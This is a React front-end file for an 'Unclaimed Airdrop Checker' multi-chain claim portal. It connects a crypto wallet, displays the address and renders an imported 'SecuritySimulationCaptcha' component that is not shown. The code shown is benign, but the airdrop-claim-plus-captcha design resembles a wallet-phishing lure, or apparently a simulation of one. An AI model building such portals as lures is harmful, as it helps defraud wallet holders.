import React, { useState, useEffect } from 'react';
import { useWeb3Modal } from '@web3modal/ethereum/react';
import SecuritySimulationCaptcha from './components/SecuritySimulationCaptcha';

function App() {
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState('');
  const { open } = useWeb3Modal();

  useEffect(() => {
    const checkWalletConnection = async () => {
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0) {
            setWalletConnected(true);
            setWalletAddress(accounts[0]);
          }
        } catch (error) {
          console.error('Error checking wallet:', error);
        }
      }
    };

    checkWalletConnection();

    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length > 0) {
          setWalletConnected(true);
          setWalletAddress(accounts[0]);
        } else {
          setWalletConnected(false);
          setWalletAddress('');
        }
      });
    }
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
      <header className="bg-white shadow-md border-b border-gray-200 sticky top-0 z-10">
        <div className="max-w-7xl mx-auto px-4 py-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center">
            <div>
              <h1 className="text-2xl font-bold text-gray-900">
                Unclaimed Airdrop Checker
              </h1>
              <p className="text-sm text-gray-500 mt-1">
                Multi-Chain Claim Portal | USDT | BNB | SOL | TRUMP
              </p>
            </div>
            <div className="flex items-center gap-3">
              <w3m-button />
              {walletConnected && (
                <div className="bg-green-100 px-3 py-1 rounded-full">
                  <span className="text-sm text-green-700 font-mono">
                    {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
                  </span>
                </div>
              )}
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4 py-8 sm:py-12 sm:px-6 lg:px-8">
        <SecuritySimulationCaptcha />
      </main>
    </div>
  );
}

export default App;
